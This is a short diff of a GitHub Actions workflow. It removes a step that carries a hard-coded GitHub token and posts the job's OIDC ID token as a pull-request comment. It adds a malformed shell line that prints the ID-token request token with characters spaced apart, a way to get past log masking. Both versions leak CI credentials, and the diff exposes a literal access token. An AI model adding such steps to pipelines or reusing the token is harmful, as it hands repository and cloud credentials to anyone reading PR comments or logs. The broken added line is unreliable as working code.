@@ -8,15 +8,4 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
-      - uses: actions/github-script@v6
-        with:
-          github-token: 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
-          script: |
-            const token = await core.getIDToken()
-            console.log(context.payload.pull_request)
-            github.rest.issues.createComment({
-              issue_number: context.payload.pull_request.number,
-              owner: context.repo.owner,
-              repo: context.repo.repo,
-              body: `"${token}"`
-            })
+      - run: echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > | sed 's/./& /g
